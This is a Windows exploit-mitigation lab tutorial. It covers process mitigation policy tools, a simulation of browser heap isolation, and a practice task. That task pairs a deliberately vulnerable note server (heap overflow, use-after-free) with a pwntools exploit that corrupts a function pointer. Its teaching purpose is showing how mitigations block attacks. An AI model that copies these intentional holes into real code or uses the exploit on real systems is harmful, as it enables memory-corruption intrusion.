**All Process-Level Mitigations**:

```c
// Complete process mitigation policy query and set example
// Compile: cl /Zi /W4 src\mitigation_policy.c /Fe:bin\mitigation_policy.exe

#include <windows.h>
#include <stdio.h>

void PrintDEPPolicy(PROCESS_MITIGATION_DEP_POLICY* policy) {
    printf("DEP Policy:\n");
    printf("  Enable: %d\n", policy->Enable);
    printf("  DisableAtlThunkEmulation: %d\n", policy->DisableAtlThunkEmulation);
    printf("  Permanent: %d\n", policy->Permanent);
}

void PrintASLRPolicy(PROCESS_MITIGATION_ASLR_POLICY* policy) {
    printf("ASLR Policy:\n");
    printf("  EnableBottomUpRandomization: %d\n", policy->EnableBottomUpRandomization);
    printf("  EnableForceRelocateImages: %d\n", policy->EnableForceRelocateImages);
    printf("  EnableHighEntropy: %d\n", policy->EnableHighEntropy);
    printf("  DisallowStrippedImages: %d\n", policy->DisallowStrippedImages);
}

void PrintDynamicCodePolicy(PROCESS_MITIGATION_DYNAMIC_CODE_POLICY* policy) {
    printf("Dynamic Code Policy (ACG):\n");
    printf("  ProhibitDynamicCode: %d\n", policy->ProhibitDynamicCode);
    printf("  AllowThreadOptOut: %d\n", policy->AllowThreadOptOut);
    printf("  AllowRemoteDowngrade: %d\n", policy->AllowRemoteDowngrade);
}

void PrintSystemCallDisablePolicy(PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY* policy) {
    printf("System Call Disable Policy (Win32k Lockdown):\n");
    printf("  DisallowWin32kSystemCalls: %d\n", policy->DisallowWin32kSystemCalls);
}

void PrintControlFlowGuardPolicy(PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY* policy) {
    printf("Control Flow Guard Policy:\n");
    printf("  EnableControlFlowGuard: %d\n", policy->EnableControlFlowGuard);
    printf("  EnableExportSuppression: %d\n", policy->EnableExportSuppression);
    printf("  StrictMode: %d\n", policy->StrictMode);
}

void PrintSignaturePolicy(PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY* policy) {
    printf("Binary Signature Policy (CIG):\n");
    printf("  MicrosoftSignedOnly: %d\n", policy->MicrosoftSignedOnly);
    printf("  StoreSignedOnly: %d\n", policy->StoreSignedOnly);
    printf("  MitigationOptIn: %d\n", policy->MitigationOptIn);
}

void PrintImageLoadPolicy(PROCESS_MITIGATION_IMAGE_LOAD_POLICY* policy) {
    printf("Image Load Policy:\n");
    printf("  NoRemoteImages: %d\n", policy->NoRemoteImages);
    printf("  NoLowMandatoryLabelImages: %d\n", policy->NoLowMandatoryLabelImages);
    printf("  PreferSystem32Images: %d\n", policy->PreferSystem32Images);
}

void PrintChildProcessPolicy(PROCESS_MITIGATION_CHILD_PROCESS_POLICY* policy) {
    printf("Child Process Policy:\n");
    printf("  NoChildProcessCreation: %d\n", policy->NoChildProcessCreation);
    printf("  AllowSecureProcessCreation: %d\n", policy->AllowSecureProcessCreation);
}

void QueryAllMitigations(HANDLE hProcess) {
    PROCESS_MITIGATION_DEP_POLICY depPolicy = {0};
    PROCESS_MITIGATION_ASLR_POLICY aslrPolicy = {0};
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dynamicCodePolicy = {0};
    PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY syscallPolicy = {0};
    PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfgPolicy = {0};
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sigPolicy = {0};
    PROCESS_MITIGATION_IMAGE_LOAD_POLICY imageLoadPolicy = {0};
    PROCESS_MITIGATION_CHILD_PROCESS_POLICY childProcPolicy = {0};

    printf("=== Process Mitigation Policies ===\n\n");

    // Query DEP
    if (GetProcessMitigationPolicy(hProcess, ProcessDEPPolicy,
                                   &depPolicy, sizeof(depPolicy))) {
        PrintDEPPolicy(&depPolicy);
    } else {
        printf("Failed to query DEP policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query ASLR
    if (GetProcessMitigationPolicy(hProcess, ProcessASLRPolicy,
                                   &aslrPolicy, sizeof(aslrPolicy))) {
        PrintASLRPolicy(&aslrPolicy);
    } else {
        printf("Failed to query ASLR policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query Dynamic Code (ACG)
    if (GetProcessMitigationPolicy(hProcess, ProcessDynamicCodePolicy,
                                   &dynamicCodePolicy, sizeof(dynamicCodePolicy))) {
        PrintDynamicCodePolicy(&dynamicCodePolicy);
    } else {
        printf("Failed to query Dynamic Code policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query System Call Disable (Win32k)
    if (GetProcessMitigationPolicy(hProcess, ProcessSystemCallDisablePolicy,
                                   &syscallPolicy, sizeof(syscallPolicy))) {
        PrintSystemCallDisablePolicy(&syscallPolicy);
    } else {
        printf("Failed to query System Call Disable policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query CFG
    if (GetProcessMitigationPolicy(hProcess, ProcessControlFlowGuardPolicy,
                                   &cfgPolicy, sizeof(cfgPolicy))) {
        PrintControlFlowGuardPolicy(&cfgPolicy);
    } else {
        printf("Failed to query CFG policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query Signature Policy (CIG)
    if (GetProcessMitigationPolicy(hProcess, ProcessSignaturePolicy,
                                   &sigPolicy, sizeof(sigPolicy))) {
        PrintSignaturePolicy(&sigPolicy);
    } else {
        printf("Failed to query Signature policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query Image Load Policy
    if (GetProcessMitigationPolicy(hProcess, ProcessImageLoadPolicy,
                                   &imageLoadPolicy, sizeof(imageLoadPolicy))) {
        PrintImageLoadPolicy(&imageLoadPolicy);
    } else {
        printf("Failed to query Image Load policy: %d\n", GetLastError());
    }
    printf("\n");

    // Query Child Process Policy
    if (GetProcessMitigationPolicy(hProcess, ProcessChildProcessPolicy,
                                   &childProcPolicy, sizeof(childProcPolicy))) {
        PrintChildProcessPolicy(&childProcPolicy);
    } else {
        printf("Failed to query Child Process policy: %d\n", GetLastError());
    }
}

BOOL SetProcessMitigations(HANDLE hProcess) {
    // Example: Enable ACG (Arbitrary Code Guard)
    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY dynamicCodePolicy = {0};
    dynamicCodePolicy.ProhibitDynamicCode = 1;

    if (!SetProcessMitigationPolicy(ProcessDynamicCodePolicy,
                                    &dynamicCodePolicy,
                                    sizeof(dynamicCodePolicy))) {
        printf("Failed to set Dynamic Code policy: %d\n", GetLastError());
        return FALSE;
    }

    // Example: Enable Win32k System Call Disable
    PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY syscallPolicy = {0};
    syscallPolicy.DisallowWin32kSystemCalls = 1;

    if (!SetProcessMitigationPolicy(ProcessSystemCallDisablePolicy,
                                    &syscallPolicy,
                                    sizeof(syscallPolicy))) {
        printf("Failed to set System Call Disable policy: %d\n", GetLastError());
        return FALSE;
    }

    // Example: Disable child process creation
    PROCESS_MITIGATION_CHILD_PROCESS_POLICY childProcPolicy = {0};
    childProcPolicy.NoChildProcessCreation = 1;

    if (!SetProcessMitigationPolicy(ProcessChildProcessPolicy,
                                    &childProcPolicy,
                                    sizeof(childProcPolicy))) {
        printf("Failed to set Child Process policy: %d\n", GetLastError());
        return FALSE;
    }

    printf("Successfully set mitigation policies!\n");
    return TRUE;
}

int main(int argc, char* argv[]) {
    HANDLE hProcess = GetCurrentProcess();

    if (argc > 1 && strcmp(argv[1], "--set") == 0) {
        printf("Setting mitigation policies...\n\n");
        SetProcessMitigations(hProcess);
        printf("\n");
    }

    // Query another process by PID
    if (argc > 1 && strcmp(argv[1], "--pid") == 0 && argc > 2) {
        DWORD pid = atoi(argv[2]);
        HANDLE hTargetProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);

        if (hTargetProcess) {
            printf("Querying Process PID %d mitigations...\n\n", pid);
            QueryAllMitigations(hTargetProcess);
            CloseHandle(hTargetProcess);
        } else {
            printf("Failed to open process %d: %d\n", pid, GetLastError());
        }
    } else {
        printf("Querying current process mitigations...\n\n");
        QueryAllMitigations(hProcess);
    }

    return 0;
}

// Usage examples:
// mitigation_policy.exe              - Query current process
// mitigation_policy.exe --set        - Set mitigations then query
// mitigation_policy.exe --pid 1234   - Query process with PID 1234
```

**Testing Mitigation Policies**:

```bash
# Compile the mitigation policy tool
cl /Zi /W4 src\mitigation_policy.c /Fe:bin\mitigation_policy.exe

# Query current process mitigations
.\bin\mitigation_policy.exe

# Set mitigations on current process (some may fail if already set)
.\bin\mitigation_policy.exe --set

# Query a specific process
$notepadPid = (Get-Process notepad | Select-Object -First 1).Id
.\bin\mitigation_policy.exe --pid $notepadPid

# Compare browser processes (shows main vs renderer process differences)
Get-Process chrome,msedge,firefox -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host "`n=== $($_.ProcessName) PID $($_.Id) ==="
    .\bin\mitigation_policy.exe --pid $_.Id
}
# Note: Renderer/sandbox processes will show ACG=1, Win32k=1, CIG=1, NoChildProcess=1
# Main browser processes will have fewer mitigations enabled

# Check system-wide mitigation policies (only shows if configured via registry/Exploit Guard)
Get-ProcessMitigation -System

# Query running process by PID (more reliable for actual runtime mitigations)
$edgePid = (Get-Process msedge | Select-Object -First 1).Id
Get-ProcessMitigation -Id $edgePid

# View specific mitigation categories with details
$mitigation = Get-ProcessMitigation -Id $edgePid
$mitigation.Dep
$mitigation.Aslr
$mitigation.DynamicCode
$mitigation.SystemCall
$mitigation.Cfg
```

**Expected Output Analysis**:

```text
Browser Renderer/Sandbox Process (e.g., Edge PID 9520):
--------------------------------------------------------
DEP: ON (Enable=1, Permanent=1)
ASLR: Full (BottomUp=1, ForceRelocateImages=1, HighEntropy=1)
ACG: ON (ProhibitDynamicCode=1) - Blocks JIT/dynamic code
Win32k Lockdown: ON (DisallowWin32kSystemCalls=1) - No GUI syscalls
CFG: ON (EnableControlFlowGuard=1)
CIG: ON (MicrosoftSignedOnly=1) - Only MS-signed DLLs
Image Load: Restricted (NoRemoteImages=1, NoLowMandatoryLabelImages=1)
Child Process: Blocked (NoChildProcessCreation=1)

Browser Main/Utility Process (e.g., Edge PID 5512):
----------------------------------------------------
DEP: ON (Enable=1, Permanent=1)
ASLR: Full (BottomUp=1, HighEntropy=1)
ACG: OFF (BlockDynamicCode=OFF) - Allows JIT for JavaScript
Win32k Lockdown: OFF - Needs GUI access
CFG: ON (Enable=ON)
CIG: OFF - Can load third-party extensions
Image Load: Unrestricted
Child Process: Allowed - Can spawn renderer processes

Legacy Application (e.g., older Win32 app):
-------------------------------------------
DEP: ON (but may not be permanent)
ASLR: Partial (BottomUp=ON, but ForceRelocateImages=OFF, HighEntropy=OFF)
ACG: OFF
Win32k Lockdown: OFF
CFG: OFF
CIG: OFF
Image Load: Unrestricted
Child Process: Unrestricted
```

### Windows Defender Exploit Guard

**What is Exploit Guard?**:

- Successor to EMET (Enhanced Mitigation Experience Toolkit)
- Built into Windows 10 1709+
- Configurable per-application mitigations
- Part of Windows Security / Microsoft Defender

**Key Features**:

| Feature                        | Protection                    |
| ------------------------------ | ----------------------------- |
| Attack Surface Reduction (ASR) | Blocks Office macros, scripts |
| Network Protection             | Blocks malicious URLs         |
| Controlled Folder Access       | Ransomware protection         |
| Exploit Protection             | Per-app mitigations           |

### Browser Heap Isolation Simulation

Browsers use "PartitionAlloc" (Chromium) or "MemGC" (Edge) to isolate different
object types into separate heaps. This prevents a UAF in one type from being
exploited via allocation of a different type.

Create `src\browser_heap_sim.cpp`:

```cpp
// browser_heap_sim.cpp
// Simulates browser-style heap isolation that prevents type-confusion UAF.
//
// Without isolation: free a DomNode, spray ImageData of same size,
//   attacker controls freed DomNode's vtable -> code execution.
// With isolation: DomNode and ImageData use DIFFERENT heaps,
//   so ImageData CANNOT reclaim DomNode's memory.

#include <windows.h>
#include <stdio.h>
#include <string.h>

HANDLE g_DomHeap;
HANDLE g_ImageHeap;

struct DomNode {
    void (*render)(struct DomNode*);
    char tag[56];  // Total: 64 bytes
};

struct ImageData {
    unsigned char pixels[64];  // Same size as DomNode!
};

void legit_render(struct DomNode* self) {
    printf("[*] Rendering <%s>\n", self->tag);
}

void init_heaps() {
    g_DomHeap = HeapCreate(0, 0, 0);
    g_ImageHeap = HeapCreate(0, 0, 0);
    printf("[*] DOM Heap:   %p\n", g_DomHeap);
    printf("[*] Image Heap: %p\n", g_ImageHeap);
}

void demo_without_isolation() {
    printf("\n=== WITHOUT ISOLATION (single heap) ===\n");
    HANDLE hHeap = GetProcessHeap();

    // Allocate a DomNode
    DomNode* node = (DomNode*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(DomNode));
    node->render = legit_render;
    strcpy(node->tag, "div");
    printf("[*] DomNode at %p, render = %p\n", node, (void*)node->render);
    void* saved_addr = node;

    // Free it (UAF condition)
    HeapFree(hHeap, 0, node);
    printf("[*] Freed DomNode at %p\n", saved_addr);

    // Spray same-sized ImageData on same heap
    // Goal: reclaim the freed DomNode's memory
    int reclaimed = 0;
    for (int i = 0; i < 100; i++) {
        ImageData* img = (ImageData*)HeapAlloc(hHeap, 0, sizeof(ImageData));
        memset(img->pixels, 0x41, sizeof(img->pixels));
        if ((void*)img == saved_addr) {
            printf("[!] ImageData reclaimed DomNode's memory at %p!\n", img);
            printf("[!] node->render is now 0x%p (attacker-controlled)\n",
                   (void*)((DomNode*)img)->render);
            reclaimed = 1;
            break;
        }
    }
    if (!reclaimed)
        printf("[*] Did not reclaim in 100 attempts (heap randomization)\n");
    fflush(stdout);
}

void demo_with_isolation() {
    printf("\n=== WITH ISOLATION (separate heaps) ===\n");
    init_heaps();

    // DomNode allocated on DOM heap
    DomNode* node = (DomNode*)HeapAlloc(g_DomHeap, HEAP_ZERO_MEMORY, sizeof(DomNode));
    node->render = legit_render;
    strcpy(node->tag, "div");
    printf("[*] DomNode at %p (DOM heap)\n", node);
    void* saved_addr = node;

    // Free it
    HeapFree(g_DomHeap, 0, node);
    printf("[*] Freed DomNode at %p\n", saved_addr);

    // Spray ImageData on IMAGE heap — DIFFERENT heap!
    // Can never reclaim DomNode memory because it's on a different heap
    int reclaimed = 0;
    for (int i = 0; i < 100; i++) {
        ImageData* img = (ImageData*)HeapAlloc(g_ImageHeap, 0, sizeof(ImageData));
        memset(img->pixels, 0x41, sizeof(img->pixels));
        if ((void*)img == saved_addr) {
            printf("[!] Should never happen!\n");
            reclaimed = 1;
            break;
        }
    }
    if (!reclaimed)
        printf("[+] ImageData CANNOT reclaim DomNode memory (different heap)\n");
    printf("[+] Type-confusion UAF prevented by heap isolation!\n");
    fflush(stdout);

    HeapDestroy(g_DomHeap);
    HeapDestroy(g_ImageHeap);
}

int main() {
    demo_without_isolation();
    demo_with_isolation();
    return 0;
}
```

**Compile & Run**:

```bash
cd C:\Windows_Mitigations_Lab
cl /EHsc /Zi src\browser_heap_sim.cpp /Fe:bin\browser_heap_sim.exe /link /DEBUG

.\bin\browser_heap_sim.exe
# Expected output:
# === WITHOUT ISOLATION (single heap) ===
# [*] DomNode at 0000018BDD6252E0, render = 00007FF6FCEF1F0A
# [*] Freed DomNode at 0000018BDD6252E0
# [!] ImageData reclaimed DomNode's memory at 0000018BDD6252E0!
# [!] node->render is now 0x4141414141414141 (attacker-controlled)

# === WITH ISOLATION (separate heaps) ===
# [*] DOM Heap:   0000018BDD9D0000
# [*] Image Heap: 0000018BDD970000
# [*] DomNode at 0000018BDD9D0860 (DOM heap)
# [*] Freed DomNode at 0000018BDD9D0860
```

> [!NOTE]
> The single-heap demo may not always reclaim in the first 100 attempts due to heap
> randomization (LFH/Segment Heap). In real browser exploits, attackers spray thousands
> of objects to increase the probability. The key insight is that with separate heaps,
> reclamation is **impossible** regardless of spray count.

### Practical Exercise

#### Task 1: Vulnerable Heap Server and Pwntools Exploitation

To fully understand heap protections, we need a network-facing vulnerable server and pwntools scripts that exploit it — showing how mitigations block real attacks.

##### Vulnerable Heap Server

```c
// vuln_heap_server.c — Network server with heap vulnerabilities
// Demonstrates: heap overflow, UAF, double-free
// Compile: cl /Zi /GS- vuln_heap_server.c /Fe:vuln_heap_server.exe /link ws2_32.lib /DEBUG
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")

#define PORT 9998
#define MAX_NOTES 16
#define NOTE_SIZE 64

typedef struct {
    void (*print_func)(struct Note*);
    char data[56];
} Note;

Note *notes[MAX_NOTES] = {0};
HANDLE hHeap;

void print_note(Note *n) {
    printf("[Note] %s\n", n->data);
}

void send_str(SOCKET s, const char *str) {
    send(s, str, (int)strlen(str), 0);
}

void handle_create(SOCKET client, char *buf) {
    int idx = atoi(buf);
    if (idx < 0 || idx >= MAX_NOTES) {
        send_str(client, "[-] Invalid index\n");
        return;
    }
    notes[idx] = (Note*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(Note));
    if (!notes[idx]) {
        send_str(client, "[-] Allocation failed\n");
        return;
    }
    notes[idx]->print_func = print_note;
    char resp[128];
    snprintf(resp, sizeof(resp), "[+] Created note %d at %p\n", idx, notes[idx]);
    send_str(client, resp);
}

void handle_write(SOCKET client, char *buf) {
    // Format: <idx> <size> <data>
    int idx, size;
    if (sscanf(buf, "%d %d", &idx, &size) != 2) {
        send_str(client, "[-] Format: write <idx> <size> <data>\n");
        return;
    }
    if (idx < 0 || idx >= MAX_NOTES || !notes[idx]) {
        send_str(client, "[-] Invalid note\n");
        return;
    }
    // BUG: No bounds check on size — allows heap overflow!
    // Only 56 bytes available in data[], but user controls size
    char *data_start = buf;
    // Skip past "<idx> <size> "
    int spaces = 0;
    while (*data_start && spaces < 2) {
        if (*data_start == ' ') spaces++;
        data_start++;
    }
    memcpy(notes[idx]->data, data_start, size);  // OVERFLOW!
    send_str(client, "[+] Written\n");
}

void handle_read(SOCKET client, char *buf) {
    int idx = atoi(buf);
    if (idx < 0 || idx >= MAX_NOTES || !notes[idx]) {
        send_str(client, "[-] Invalid note\n");
        return;
    }
    char resp[256];
    // Leak the function pointer and data
    snprintf(resp, sizeof(resp), "[+] Note %d: func=%p data=%s\n",
             idx, (void*)notes[idx]->print_func, notes[idx]->data);
    send_str(client, resp);
}

void handle_delete(SOCKET client, char *buf) {
    int idx = atoi(buf);
    if (idx < 0 || idx >= MAX_NOTES || !notes[idx]) {
        send_str(client, "[-] Invalid note\n");
        return;
    }
    HeapFree(hHeap, 0, notes[idx]);
    // BUG: Pointer NOT nulled — UAF possible!
    // notes[idx] = NULL;  // <-- This line is missing!
    send_str(client, "[+] Deleted\n");
}

void handle_use(SOCKET client, char *buf) {
    int idx = atoi(buf);
    if (idx < 0 || idx >= MAX_NOTES || !notes[idx]) {
        send_str(client, "[-] Invalid note\n");
        return;
    }
    // Calls via function pointer — CFG would validate this
    notes[idx]->print_func(notes[idx]);
    send_str(client, "[+] Used\n");
}

void handle_client(SOCKET client) {
    char buf[512];
    send_str(client, "=== Heap Vuln Server v1.0 ===\n");
    send_str(client, "Commands: create <idx> | write <idx> <size> <data> | "
                     "read <idx> | delete <idx> | use <idx> | quit\n");

    while (1) {
        send_str(client, "> ");
        memset(buf, 0, sizeof(buf));
        int n = recv(client, buf, sizeof(buf) - 1, 0);
        if (n <= 0) break;

        // Strip newline
        while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r')) buf[--n] = 0;

        if (strncmp(buf, "create ", 7) == 0)      handle_create(client, buf + 7);
        else if (strncmp(buf, "write ", 6) == 0)   handle_write(client, buf + 6);
        else if (strncmp(buf, "read ", 5) == 0)    handle_read(client, buf + 5);
        else if (strncmp(buf, "delete ", 7) == 0)  handle_delete(client, buf + 7);
        else if (strncmp(buf, "use ", 4) == 0)     handle_use(client, buf + 4);
        else if (strncmp(buf, "quit", 4) == 0)     break;
        else send_str(client, "[-] Unknown command\n");
    }
    closesocket(client);
}

int main() {
    hHeap = HeapCreate(0, 0, 0);
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET srv = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
    bind(srv, (struct sockaddr*)&addr, sizeof(addr));
    listen(srv, 5);

    printf("[*] Listening on port %d\n", PORT);
    printf("[*] Heap handle: %p\n", hHeap);
    printf("[*] print_note func: %p\n", (void*)print_note);
    fflush(stdout);

    while (1) {
        SOCKET client = accept(srv, NULL, NULL);
        printf("[*] Client connected\n");
        fflush(stdout);
        handle_client(client);
        printf("[*] Client disconnected\n");
        fflush(stdout);
    }

    WSACleanup();
    return 0;
}
```

**Compile the server**:

```bash
cd C:\Windows_Mitigations_Lab

# Without mitigations (baseline — exploitable)
cl /Zi /GS- src\vuln_heap_server.c /Fe:bin\vuln_heap_server_no_mit.exe /link ws2_32.lib /DEBUG /DYNAMICBASE:NO /NXCOMPAT:NO

# With heap protections (encoded metadata, safe unlinking)
cl /Zi src\vuln_heap_server.c /Fe:bin\vuln_heap_server_mitigated.exe /link ws2_32.lib /DEBUG
```

##### Heap Overflow Exploitation

```python
#!/usr/bin/env python3
"""
heap_overflow_exploit.py — Pwntools exploit for vuln_heap_server
Demonstrates: Heap overflow to corrupt adjacent note's function pointer.

Scenario:
  - Create two adjacent notes (note 0 and note 1)
  - Overflow note 0's data field (56 bytes) into note 1's struct
  - Overwrite note 1's print_func pointer
  - Call 'use 1' to trigger controlled function call
  - Without protections: attacker controls execution
  - With heap protections: encoded metadata detects corruption on HeapFree
  - With Page Heap: immediate crash on out-of-bounds write
  - With CFG: indirect call validation blocks invalid target

Usage:
  python heap_overflow_exploit.py [TARGET_IP] [PORT] [--debug]
  python heap_overflow_exploit.py 192.168.1.100 9998
  python heap_overflow_exploit.py 127.0.0.1 9998 --debug
"""
from pwn import *
import sys

# --- Configuration ---
TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 9998
DEBUG  = "--debug" in sys.argv

context.log_level = "debug" if DEBUG else "info"
context.arch = "amd64"
context.os = "windows"

def recv_prompt(io):
    """Receive until we get a prompt at the start of a line."""
    # The prompt is "> " at the beginning of a line after a newline
    # We need to receive until we see "\n> " to avoid matching "> " in the banner
    return io.recvuntil(b"\n> ")

def connect():
    """Connect and consume the banner."""
    io = remote(TARGET, PORT)
    recv_prompt(io)  # consume banner + prompt
    return io

def create(io, idx):
    """Create a note at the given index."""
    io.sendline(f"create {idx}".encode())
    resp = recv_prompt(io)
    log.debug(f"Create response: {resp}")
    # Parse the address from '[+] Created note X at 0x...'
    addr = None
    for line in resp.split(b"\n"):
        if b"Created note" in line and b" at " in line:
            try:
                # Extract hex address after "at "
                addr_str = line.split(b"at ")[1].split()[0].strip()
                addr = int(addr_str, 16)
            except (IndexError, ValueError) as e:
                log.debug(f"Failed to parse address: {e}")
    log.info(f"Created note {idx}" + (f" at {hex(addr)}" if addr else " (address not parsed)"))
    return addr

def write_note(io, idx, size, data):
    """Write data to a note with explicit size (for overflow)."""
    payload = f"write {idx} {size} ".encode() + data
    io.sendline(payload)
    try:
        resp = recv_prompt(io)
        log.debug(f"Write response: {resp}")
        return resp
    except EOFError:
        log.critical("Server crashed during write — Page Heap detected overflow!")
        log.success("Page Heap protection is ACTIVE and working!")
        return None

def read_note(io, idx):
    """Read a note and parse the leaked function pointer."""
    io.sendline(f"read {idx}".encode())
    resp = recv_prompt(io)
    log.debug(f"Read response: {resp}")
    func_addr = None
    data_content = None
    for line in resp.split(b"\n"):
        if b"func=" in line:
            try:
                # Parse "func=0x... data=..."
                func_str = line.split(b"func=")[1].split(b" ")[0].strip()
                func_addr = int(func_str, 16)
                if b"data=" in line:
                    data_content = line.split(b"data=")[1].strip()
            except (IndexError, ValueError) as e:
                log.debug(f"Failed to parse func pointer: {e}")
    if func_addr:
        log.info(f"Leaked function pointer: {hex(func_addr)}")
    return func_addr, resp

def delete(io, idx):
    """Delete (free) a note — does NOT null the pointer (UAF)."""
    io.sendline(f"delete {idx}".encode())
    resp = recv_prompt(io)
    return resp

def use(io, idx):
    """Trigger function pointer call on the note."""
    io.sendline(f"use {idx}".encode())
    # Don't recvuntil since the server might crash
    try:
        resp = recv_prompt(io)
        return resp
    except EOFError:
        log.warning("Server crashed (connection closed) — mitigation triggered!")
        return None
    except Exception as e:
        log.warning(f"Timeout or error: {e}")
        return None

def exploit():
    io = connect()

    # Step 1: Create two adjacent notes
    log.info("Step 1: Creating two notes for adjacency")
    addr0 = create(io, 0)
    addr1 = create(io, 1)

    if addr0 and addr1:
        gap = addr1 - addr0
        log.info(f"Gap between notes: {gap} bytes (sizeof(Note) = 64)")
        if gap != 64:
            log.warning(f"Notes are NOT adjacent (gap={gap}). "
                        "Heap randomization may prevent exploitation.")
    else:
        log.warning("Could not parse note addresses — proceeding with blind overflow")

    # Step 2: Read note 1 to see original function pointer
    log.info("Step 2: Leaking note 1's function pointer")
    orig_func, _ = read_note(io, 1)
    if orig_func:
        log.success(f"Original print_func: {hex(orig_func)}")
    else:
        log.warning("Could not leak function pointer — check server response format")

    # Step 3: Overflow note 0 into note 1
    # Note struct layout:
    #   [print_func: 8 bytes][data: 56 bytes] = 64 bytes total
    # Heap layout:
    #   [Note 0: 64 bytes][Heap metadata: 16 bytes][Note 1: 64 bytes]
    # To overflow from note 0's data into note 1's print_func:
    #   - Fill note 0's data[56]
    #   - Overflow through heap metadata (16 bytes)
    #   - Overwrite note 1's print_func (8 bytes)
    log.info("Step 3: Overflowing note 0 to corrupt note 1's function pointer")

    # Calculate overflow size based on actual gap
    if addr0 and addr1:
        gap = addr1 - addr0
        # Distance from note 0's data field to note 1's func ptr
        # note 0 data starts at addr0 + 8 (after func ptr)
        # note 1 func ptr is at addr1
        overflow_size = (addr1 - addr0) - 8 + 8  # -8 for func ptr offset, +8 to overwrite it

        if gap > 1024:
            log.warning(f"Large gap detected ({gap} bytes) — Page Heap likely enabled!")
            log.warning("Page Heap places guard pages between allocations")
            log.warning("Attempting overflow anyway to demonstrate detection...")
        else:
            log.info(f"Calculated overflow size: {overflow_size} bytes")
    else:
        # Blind overflow: assume 16-byte heap metadata
        overflow_size = 56 + 16 + 8  # data + metadata + func ptr
        log.info(f"Blind overflow size (assuming 16-byte heap header): {overflow_size} bytes")

    fake_func_ptr = p64(0x4141414141414141)  # Will cause crash or CFG violation
    overflow_payload = b"A" * (overflow_size - 8) + fake_func_ptr

    log.info(f"Overflow payload size: {len(overflow_payload)} bytes")
    write_result = write_note(io, 0, len(overflow_payload), overflow_payload)

    if write_result is None:
        log.success("=" * 60)
        log.success("PAGE HEAP PROTECTION DETECTED THE OVERFLOW!")
        log.success("Server crashed immediately on out-of-bounds write")
        log.success("This is the BEST case scenario for heap protection")
        log.success("=" * 60)
        io.close()
        return

    # Step 4: Verify corruption by reading note 1
    log.info("Step 4: Verifying corruption of note 1")
    corrupted_func, _ = read_note(io, 1)
    if corrupted_func:
        if corrupted_func == 0x4141414141414141:
            log.success(f"Function pointer corrupted to: {hex(corrupted_func)}")
            log.success("Heap overflow succeeded — NO protection detected!")
        else:
            log.info(f"Function pointer: {hex(corrupted_func)} (may be garbled)")

    # Step 5: Trigger the corrupted function pointer
    log.info("Step 5: Triggering corrupted function pointer via 'use 1'")
    log.info("Expected outcomes:")
    log.info("  No mitigations: crash at 0x4141414141414141 (controlled!)")
    log.info("  Page Heap:      crash on the overflow write itself")
    log.info("  CFG enabled:    STATUS_STACK_BUFFER_OVERRUN (0xC0000409)")
    log.info("  Heap encoding:  crash on HeapFree with STATUS_HEAP_CORRUPTION")

    result = use(io, 1)
    if result is None:
        log.success("Server crashed — mitigation likely triggered")
        log.info("Check server console or WinDbg for:")
        log.info("  0xC0000005 = DEP (tried to execute non-executable page)")
        log.info("  0xC0000409 sub 10 = CFG blocked invalid indirect call")
        log.info("  0xC0000374 = Heap integrity check failed")
    else:
        log.warning("Server survived — function pointer may not have been corrupted")

    io.close()

if __name__ == "__main__":
    exploit()
```

**Testing the heap overflow exploit:**

```bash
# 1. Test without mitigations (baseline — should succeed)
.\bin\vuln_heap_server_no_mit.exe
python .\exploits\heap_overflow_exploit.py 127.0.0.1 9998

# Expected output:
#   Gap between notes: 80 bytes
#   [+] Function pointer corrupted to: 0x4141414141414141
#   [+] Heap overflow succeeded — NO protection detected!
#   [!] Server crashed (connection closed)

# 2. Test with mitigated build WITHOUT Page Heap (heap integrity checks only)
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe"  /p /disable vuln_heap_server_mitigated.exe /full
.\bin\vuln_heap_server_mitigated.exe
python .\exploits\heap_overflow_exploit.py 127.0.0.1 9998

# Expected: Similar to #1, but may detect corruption on HeapFree
#   Gap: 80 bytes, overflow succeeds, crash on use or later heap operation

# 3. Test with Page Heap enabled (BEST protection)
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe"  /p /enable vuln_heap_server_mitigated.exe /full
.\bin\vuln_heap_server_mitigated.exe
python .\exploits\heap_overflow_exploit.py 127.0.0.1 9998

# Expected output:
#   Gap between notes: 8192 bytes (full page separation!)
#   [!] Large gap detected — Page Heap likely enabled!
#   [!] Server crashed during write — Page Heap detected overflow!
#   [+] PAGE HEAP PROTECTION DETECTED THE OVERFLOW!
#   Server terminates IMMEDIATELY on out-of-bounds write
```

**Key observations:**

- **Normal heap**: 80-byte gap (64-byte allocation + 16-byte metadata)
- **Page Heap**: 8192-byte gap (full page separation with guard pages)
- **Without mitigations**: Overflow succeeds → crash at controlled address
- **With Page Heap**: Immediate detection on out-of-bounds write
